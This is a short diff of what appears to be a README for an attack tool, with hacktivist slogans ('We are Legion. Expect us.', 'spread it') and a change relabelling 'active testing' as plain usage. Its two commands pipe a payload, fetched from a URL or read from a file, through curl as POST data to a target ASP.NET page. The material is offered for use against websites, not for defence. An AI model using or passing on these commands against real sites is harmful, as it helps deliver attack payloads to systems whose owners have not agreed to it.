@@ -5,7 +5,7 @@ get it. use it. spread it.
 
 We are Legion. Expect us.
 
-For aktive Testing:
+use like this:
 
 curl <url> | curl http://target/website.aspx -d@-
 cat PayloadFile | curl http://target/website.aspx -d@-
